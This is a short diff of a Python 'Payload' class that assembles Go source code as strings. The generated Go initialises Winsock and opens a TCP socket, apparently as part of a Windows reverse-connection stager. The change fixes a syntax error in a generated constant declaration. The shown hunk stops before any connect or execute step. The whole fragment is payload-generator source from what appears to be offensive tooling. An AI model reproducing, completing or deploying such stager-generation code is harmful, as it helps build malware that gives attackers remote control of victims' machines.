@@ -69,7 +69,7 @@ class Payload:
         payloadCode += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" %(addr, err, addr)
 
         payloadCode += "func main() {\n"
-        payloadCode += "const %s 1000 << 10\n" %(constSize)
+        payloadCode += "const %s = 1000 << 10\n" %(constSize)
         payloadCode += "var %s syscall.WSAData\n" %(wsadata)
         payloadCode += "syscall.WSAStartup(uint32(0x202), &%s)\n" %(wsadata)
         payloadCode += "%s, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n" %(socket)
